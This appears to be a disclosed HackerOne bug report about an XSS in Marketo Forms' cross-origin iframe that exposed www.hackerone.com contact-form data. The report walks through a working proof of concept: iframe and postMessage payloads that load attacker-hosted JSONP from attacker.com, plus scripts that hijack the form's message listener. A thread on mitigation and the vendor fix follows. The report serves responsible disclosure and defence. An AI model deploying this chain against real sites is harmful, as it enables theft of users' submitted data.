{"id":207042,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDcwNDI=","url":"https://hackerone.com/reports/207042","title":"Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-02-17T04:18:23.540Z","submitted_at":"2017-02-17T04:18:23.540Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fransrosen","url":"/fransrosen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-08-29T14:58:40.288Z","bug_reporter_agreed_on_going_public_at":"2017-08-24T12:02:13.778Z","team_member_agreed_on_going_public_at":"2017-08-29T14:58:40.209Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI just discovered that there's a scenario where the Marketo Forms solution being used on www.hackerone.com can actually be abused, using a few fun techniques, to trigger an XSS in the Cross-Origin-iframe being used by Marketo. This results in eavesdropping of the data being sent in the contact-form on www.hackerone.com.\n\nWhat also made this nice on HackerOne was the auto-trigger to launch the contact form without any interaction using the `#contact`-fragment:\n\n```js\n if(/^#contact/.test(window.location.hash) === true) {\n    LoadContactForm();\n }\n```\n\n### PoC\n\nMy PoC looks like this:\n\n{F161524}\n\nPoC-link is here, it will popup alert when form is submitted with the data:\nhttps://█████/marketo2.html \n\nOnly an annoying alert: \nhttps://████████/marketo.html\n\n### Technical details\n\nSo, let's dig down what actually happens here.\n\n#### Marketo cross domain AJAX request window\n\nMarketo uses an iframe that is located here (the `sj17` is just a specific instance on Marketo, this one differs between customers):\n\nhttps://app-sj17.marketo.com/index.php/form/XDFrame\n\nThis page contains a `postMessage`-listener to launch an ajax-call:\n\n```js\nif(!window.parent || window.parent == window){\n  return;\n}\n$(window).on(\"message\", function (e){\n  ...\n  if(message \u0026\u0026 message.mktoRequest \u0026\u0026 message.mktoRequest.ajaxParams){\n    var params = message.mktoRequest.ajaxParams;\n    ...\n    $.ajax(params);\n```\n\nFirst, as you see, the window will not work without any window parent. If it's framed, it'll start the listener. Passing arbitrary parameters to `$.ajax` is bad. Sending the following payload as the `ajaxParams`:\n\n```\n{\"url\":\"https://attacker.com/jsonp.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}\n```\n\nHaving the following content on the `jsonp.php`-endpoint:\n\n```\n\u003c?\nheader(\"Access-Control-Allow-Origin: *\");\n?\u003e\nalert(document.domain)\n```\n\nWill result in an XSS on this marketo.com-domain.\n\n#### postMessage passing\n\nSince no origins are being used here, we can just pass any messages we like, from wherever we like.\n\nTo abuse this on www.hackerone.com we need to do the following:\n\n1. Create our springboard page which will have an iframe of the `XDFrame` for Marketo:\n\n```html\n\u003ciframe id=\"x\" name=\"x\" border=\"0\" frameborder=\"0\" width=\"100\" height=\"30\" src=\"https://app-sj17.marketo.com/index.php/form/XDFrame\"\u003e\u003c/iframe\u003e\n```\n\n2. We listen to the message we get from the iframe to trigger our payload and we send back a `postMessage` loading a JSONP-endpoint with a function to create a link to www.hackerone.com with the `#contact` fragment:\n\n```html\n\u003cscript\u003e\nvar run = false\nvar b\nwindow.onmessage=function() {\n\tif(!run)\n\tx.postMessage('{\"mktoRequest\":{\"ajaxParams\":{\"url\":\"https://attacker.com/jsonp.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}}}', '*')\n\trun = true\n}\n\u003c/script\u003e\n```\n\nThis is the content of `jsonp.php`:\n\n```php\n\u003c?\nheader(\"Access-Control-Allow-Origin: *\");\n?\u003e\n(function(){\ndocument.body.innerHTML='\u003ca href=\"#\" onclick=\"window.b=window.open(\\'https://www.hackerone.com/product/overview#contact\\',\\'b\\',\\'\\')\"\u003eClick me!\u003c/a\u003e'\n\nsetInterval(function() {\ntry {\n\tb['frames'][0].postMessage('{\"mktoRequest\":{\"ajaxParams\":{\"url\":\"https://attacker.com/jsonp2.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}}}', '*')\n} catch(e){}\n}, 1000);\n})()\n```\n\nWhen victim clicks the link, we start a interval of `postMessage`-sending to `b['frames'][0]` which should be the Marketo iframe on www.hackerone.com. Interesting enough, Marketo actually sets the name of the frame to `mktoFormsXDIframe + Math.random()` but this can be completely bypassed using `window['frames'][0]` instead.\n\nOur code in `jsonp2.php` looks like this:\n\n```php\n\u003c?\nheader(\"Access-Control-Allow-Origin: *\");\n?\u003e\n(function(){\n\tif(window.icanhazmsg) return\n\twindow.icanhazmsg=true\n\twindow.onmessage=function(a) {\n\t\tif(a.origin.indexOf('marketo') !== -1) return;\n\t\tconsole.log(a);\n\t\talert(\"I HAVE YOUR DATA NOW\\n\" + a.data)\n\t}\n})()\n```\n\nAs you see, we now use the XSS passed from our springboard-iframe to the iframe on www.hackerone.com to register a listener to pop an alert when data is submitted in the form.\n\nGetting the victim to submit the form, will result in the infamous popup:\n\n{F161523}\n\nSo, what we did was the following:\n\n1. Attacker's page -\u003e Marketo iframe\n2. postMessage from Marketo iframe -\u003e Attacker's page\n3. Attacker's page -\u003e postMessage loading JSONP -\u003e Marketo iframe\n4. Create link on Marketo iframe -\u003e start sending postMessage\n5. Link opens www.hackerone.com in new tab, triggers contact form to show using `#contact`\n6. Sends over postMessage from opener. XSS register listener in Marketo iframe\n7. Victim submits form, XSS reads data\n  \n\n### Conclusion\n\nI played around a bit with this issue and came to the following conclusion:\n\n1. Marketo Forms doesn't use any origin-checks of the postMessage sent to their Cross Origin Frame. This is most likely because the whole point with the frame is to communicate with any page that uses Marketo. This is probably per design.\n2. Marketo Forms allows a bit too much flexibility for the page sending the postMessage. It's actually just throwing in a complete object called `ajaxParams` directly into `$.ajax()`. This results in the XSS on `app-*.marketo.com`. I think this is the best thing to patch up properly, not allowing full control over these params, especially not the `jsonp`-mode of jQuery.\n3. In HackerOne's case, no data is handled sent from the `error` and `success` functions being triggered when the form is posted which most likely saves HackerOne from getting a proper XSS on their own domain. However, since the data submitted in the form is still passed through the iframe, data can still be stolen using this technique.\n\nRegards,\nFrans","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":161523,"file_name":"Screen_Shot_2017-02-17_at_05.07.40.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/523/ca85724b4b8f55fb5d57daecb86fb41fc32894ff/Screen_Shot_2017-02-17_at_05.07.40.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-02-17_at_05.07.40.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-02-17_at_05.07.40.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140259Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=638cdc842b8c8b8c44526df59a45f1a9011e003031bf888b2a7f5870db7c1f55","file_size":177714,"type":"image/png"},{"id":161524,"file_name":"Marketo2.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/161/524/83a4181295e9a3b278da51a657f26637c5872b77/Marketo2.mp4?response-content-disposition=attachment%3B%20filename%3D%22Marketo2.mp4%22%3B%20filename%2A%3DUTF-8%27%27Marketo2.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140259Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=63af6ae370a0476d9e81af3669b0eef749d76ba450bc22e4469d96c87d996ce5","file_size":3852036,"type":"video/mp4"}],"allow_singular_disclosure_at":"2017-09-23T12:02:13.857Z","allow_singular_disclosure_after":-127792845.95253858,"singular_disclosure_allowed":true,"vote_count":139,"voters":["bleg","pajoda","flamezzz","smsecurity","sp1d3rs","jr0ch17","yxw21","cache-money","europa","kapytein","and 129 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1490858,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, @fransrosen. I just opened a case with Marketo about this issue, and I'll keep you in the loop.\n\nBesides removing their forms code, is there anything you see that we could do in the mean time to mitigate this from our perspective?","automated_response":false,"created_at":"2017-02-17T08:23:13.838Z","updated_at":"2017-02-17T08:23:13.838Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1490900,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @reed! Short answer: No.\n\nLong answer:\nYou could perhaps use a modified script instead of theirs, since their endpoint always responds with `Access-Control-Allow-Origin:*`, so the XDFrame could be created in a different context still sending data to it. \n\nThat would need you to:\n1. Have your own `forms2.min.js` located on for example a `hackerone-ext-content.com`-domain.\n2. Modify that script to load a different XDFrame also on `hackerone-ext-content.com`.\n3. That XDFrame could then either be locked down completely by you:\n    \n    ```js\n$(window).on(\"message\", function (e){\n          var origin = e.originalEvent.origin;\n          if(origin != \"https://www.hackerone.com\") return\n    ```\n    \n4. Which would make `postMessage` only work from your own origin.\n\nI think a future proper mitigation would be for Marketo to get the script to pass an origin to the XDFrame when the script is initalized, which would then be checked against the `origin` in the postMessage to only allow the original origin to talk with it.\n\nHope this helps.\n\nRegards,\nFrans","automated_response":false,"created_at":"2017-02-17T08:55:36.073Z","updated_at":"2017-02-17T08:55:36.073Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1506072,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2017-02-26T04:24:52.931Z","updated_at":"2017-02-26T04:24:52.931Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1518425,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Frans!\n\nJust touching base, wanted to let you know we were still trucking away on this. \n\nThanks!\n\n\nEvan","automated_response":false,"created_at":"2017-03-03T22:30:11.207Z","updated_at":"2017-03-03T22:30:11.207Z","actor":{"username":"ebrynne","cleared":false,"url":"/ebrynne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/191/f333df32e9b61845f5c823b77d968fa6d246d336_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1551858,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @fransrosen,\n\nWe're currently awaiting a response from Marketo, sorry for delay!\n\nCheers,\nDirk","automated_response":false,"created_at":"2017-03-20T10:52:44.626Z","updated_at":"2017-03-20T10:52:44.626Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1569661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Marketo is still working on this. I'll poke them again.","automated_response":false,"created_at":"2017-03-29T07:47:50.129Z","updated_at":"2017-03-29T07:47:50.129Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1646072,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Spoke to Marketo, and their ETA for a fix is late June during their next major update. Sounds like this \"fix\" will be opt-in as well, as apparently, customers rely on this security issue. We'll keep this open until it's resolved, though.","automated_response":false,"created_at":"2017-05-01T08:19:15.915Z","updated_at":"2017-05-01T08:19:15.915Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1655893,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks guys for the updates! Looking forward into getting this resolved.\n\nCheers,\nFrans","automated_response":false,"created_at":"2017-05-05T07:41:48.852Z","updated_at":"2017-05-05T07:41:48.852Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1667337,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Marketo provided this update today:\n\n\u003e Our Engineering team has confirmed that they are updating our systems to allow customers to set custom CORS headers for their landing pages and forms.\n\u003e\n\u003e The planned release is currently set for our Q2 release. \n\u003e\n\u003e You can track the release via:\n\u003e http://docs.marketo.com/display/public/DOCS/2017+Release+Schedule\n\n@fransrosen, do you feel that allowing us to disable CORS for their endpoint would actually solve this? Seems like not the optimal fix to me at all...","automated_response":false,"created_at":"2017-05-11T06:11:09.328Z","updated_at":"2017-05-11T06:11:09.328Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1667387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That's interesting. It doesn't sound like that will solve anything regarding this issue, but it depends on what they mean with `set custom CORS headers`. I mean, if that will restrict what params to allow to be sent using `postMessage` to `$.ajax`, that would mitigate the first step in my PoC, limiting getting the XSS on the marketo.com-domain. \n\nHowever, I would assume that is not what they mean.\n\nIn my PoC above, there's nothing that abuses too open CORS-headers, I use postMessage to Marketo to XSS one iframe, launching www.hackerone.com from it, giving me cross window-access to the Marketo-iframe on www.hackerone.com. Allowing me, due to the first XSS, to also XSS the iframe on www.hackerone.com taking over the `postMessage`-listener to steal the data. \n\nHope you can make them understand this might not be a sufficient patch.","automated_response":false,"created_at":"2017-05-11T06:46:24.412Z","updated_at":"2017-05-11T06:46:24.412Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1693378,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I provided your feedback to Marketo, but haven't heard anything back from them. Will poke again.","automated_response":false,"created_at":"2017-05-22T23:21:26.977Z","updated_at":"2017-05-22T23:21:26.977Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1694057,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"While Marketo hasn't yet fixed the issue (and it's unfortunate that it is taking them this long), we want to go ahead and award a bounty based on what we understand the severity of the issue and how it affects us.\n\nAs always, we are super appreciative of the creativity and thoroughness of your reports, and we welcome many more future reports like this.\n\nHappy hacking! :)","automated_response":false,"created_at":"2017-05-23T06:59:10.586Z","updated_at":"2017-05-23T06:59:10.586Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"fransrosen","url":"/fransrosen"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1708338,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot guys! Looking forward to getting this resolved and published :)","automated_response":false,"created_at":"2017-05-29T23:09:41.185Z","updated_at":"2017-05-29T23:09:41.185Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1767713,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @fransrosen,\n\nI wanted to let you know we're still waiting for Marketo, sorry for the long wait!","automated_response":false,"created_at":"2017-06-20T08:43:27.223Z","updated_at":"2017-06-20T08:43:27.223Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1773027,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks Dirk, looking forward to getting this stuff fixed.. :)","automated_response":false,"created_at":"2017-06-21T22:44:08.776Z","updated_at":"2017-06-21T22:44:08.776Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1951038,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nI noticed the XDFrame was now updated to:\n\n```js\nvar params = { type:\"POST\", dataType:\"json\", url:p.url, data:p.data, crossDomain:false, jsonp:false };\n```\n\nIf I'm not mistaken, this means that only the message sending the data through postMessage will be able to decide where the POST-data is sent, and we're not able to utilize JSONP to trigger an XSS on the marketo-domain, as it's disabled in the ajax-params. I would call this a proper fix!\n\nTook a while, but finally!","automated_response":false,"created_at":"2017-08-24T06:44:53.235Z","updated_at":"2017-08-24T06:44:53.235Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1951668,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@fransrosen,\n\nThank you very much for the awesome report and for confirming the fix. We extend our apologies for the long delay which was due to circumstances beyond our control. Your effort is appreciated and we wish that you'll continue to research and submit any future security issues you find.\n\nRegards.\n@joystick ","automated_response":false,"created_at":"2017-08-24T11:59:19.187Z","updated_at":"2017-08-24T11:59:19.187Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"fransrosen","url":"/fransrosen"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1951671,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Awesome, since they now have a fix in place, I would love to get it out there if possible.","automated_response":false,"created_at":"2017-08-24T12:02:13.799Z","updated_at":"2017-08-24T12:02:13.799Z","first_to_agree":true,"actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1963233,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-08-29T14:58:40.230Z","updated_at":"2017-08-29T14:58:40.230Z","actor":{"username":"jjoos","cleared":false,"url":"/jjoos","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/059/21840b8ea35224c071947ddcac0b9eb0801e0235_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1963234,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-08-29T14:58:40.308Z","updated_at":"2017-08-29T14:58:40.308Z","actor":{"username":"jjoos","cleared":false,"url":"/jjoos","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/059/21840b8ea35224c071947ddcac0b9eb0801e0235_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":t